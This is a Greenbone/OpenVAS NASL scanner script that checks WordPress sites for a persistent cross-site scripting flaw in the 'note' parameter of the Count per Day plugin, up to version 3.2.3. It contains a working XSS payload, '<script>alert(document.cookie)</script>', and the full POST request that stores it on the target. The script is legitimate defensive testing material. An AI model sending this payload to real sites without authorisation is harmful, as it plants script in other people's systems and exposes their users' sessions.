CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.803009" );
	script_version( "2019-12-05T15:10:00+0000" );
	script_bugtraq_id( 55231 );
	script_tag( name: "cvss_base", value: "4.3" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:M/Au:N/C:N/I:P/A:N" );
	script_tag( name: "last_modification", value: "2019-12-05 15:10:00 +0000 (Thu, 05 Dec 2019)" );
	script_tag( name: "creation_date", value: "2012-08-28 12:46:18 +0530 (Tue, 28 Aug 2012)" );
	script_name( "WordPress Count per Day Plugin 'note' Parameter Persistent XSS Vulnerability" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/20862/" );
	script_xref( name: "URL", value: "http://packetstormsecurity.org/files/115904/WordPress-Count-Per-Day-3.2.3-Cross-Site-Scripting.html" );
	script_category( ACT_ATTACK );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_copyright( "This script is Copyright (C) 2012 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "impact", value: "Successful exploitation will allow remote attackers to insert
arbitrary HTML and script code, which will be executed in a user's browser
session in the context of an affected site." );
	script_tag( name: "affected", value: "WordPress Count per Day Plugin version 3.2.3 and prior" );
	script_tag( name: "insight", value: "The input passed via 'note' parameter to
'/wp-content/plugins/count-per-day/notes.php' script is not properly
validated, which allows attackers to execute arbitrary HTML and script code
in a user's browser session in the context of an affected site." );
	script_tag( name: "solution", value: "Update to version 3.2.4 or later." );
	script_tag( name: "summary", value: "This host is running WordPress with Count per Day plugin and is
prone to cross site scripting vulnerability." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://wordpress.org/extend/plugins/count-per-day" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
if(!port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: port )){
	exit( 0 );
}
useragent = http_get_user_agent();
host = http_host_name( port: port );
url = dir + "/wp-content/plugins/count-per-day/notes.php";
if(http_vuln_check( port: port, url: url, check_header: TRUE, pattern: "<title>CountPerDay" )){
	postdata = "month=8&year=2012&date=2012-08-28&note=<script>" + "alert(document.cookie)</script>&new=%2B";
	cdReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: application/x-www-form-urlencoded\\r\\n", "Content-Length: ", strlen( postdata ), "\\r\\n", "\\r\\n", postdata );
	cdRes = http_keepalive_send_recv( port: port, data: cdReq );
	if(cdRes && IsMatchRegexp( cdRes, "HTTP/1\\.[0-9]+ 200" ) && ContainsString( cdRes, "<title>CountPerDay" ) && ContainsString( cdRes, "<script>alert(document.cookie)</script>" )){
		security_message( port: port, data: "The target host was found to be vulnerable" );
	}
}

